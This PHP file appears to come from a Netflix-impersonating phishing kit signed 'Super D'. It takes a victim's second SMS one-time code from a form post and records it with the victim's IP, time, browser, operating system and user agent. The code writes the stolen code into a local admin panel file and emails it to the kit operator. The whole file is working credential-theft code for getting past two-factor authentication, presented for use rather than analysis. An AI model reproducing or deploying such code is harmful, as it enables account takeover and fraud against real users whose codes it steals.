<?php
/*
SUPER D
*/
@ini_set('display_errors', 'on');
if(isset($_POST['otp2'])){session_start(); 
require 'detect.php';
include "../../config.php";
$IP = getenv("REMOTE_ADDR");$date = date("d M, Y");$times = date("g:i a");$otp2 = $_POST['otp2'];$useragent = $_SERVER['HTTP_USER_AGENT'];$ecran = $_SESSION['computer'];$brow = $_SESSION['browser'];$sys = $_SESSION['os'];$code = $_SESSION['ip_countryCode']=clientData('code');$country = strtolower($code);
//msg for email & telegram "text"
$msg = '
[+]━━━━━━━━━━━━━━━━【NetFlix】━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【👤 SMS 2 INFO]━━━━━━━━━━━━━━━━[+]
[👤 CODE ] = '.$otp2.'
[+]━━━━━━━━━━━━━━━━━【💻 System】━━━━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$IP.'
[⏰ TIME/DATE] ='.$times.' / '.$date.'
[🌐 BROWSER] = '.$brow.' and '.$sys.'
[🖖 FINGERPRINT] = '.$useragent.'
[+]━━━━━━━━━━━━━━━━【NetFlix】━━━━━━━━━━━━━━━━━[+]
';
//msg for admin panel "html"
$msght = '<tr>
			<td width="80">
			<p align="center"><img src="'.$_SESSION['ip_countryCode'].'">   ' .$IP.'</td>
			<td width="30">
			<p align="center">SMS 2</td>
			<td width="40">
			<p align="center">'.$otp2.'</td>
			<td width="40">
			<p align="center">'.$times.' / '.$date.'</td>
			</font></td></tr>';
$save=fopen("../panel/otp".$namerand.".html", "a+");fwrite($save,$msght);fclose($save);
$subject  = " [ NETFLIX SMS 2 ] / ".$IP." / Super 'D' ";$headers = "From: NETFLIX \r\n";mail($yourmail, $subject, $msg, $headers);
}
?>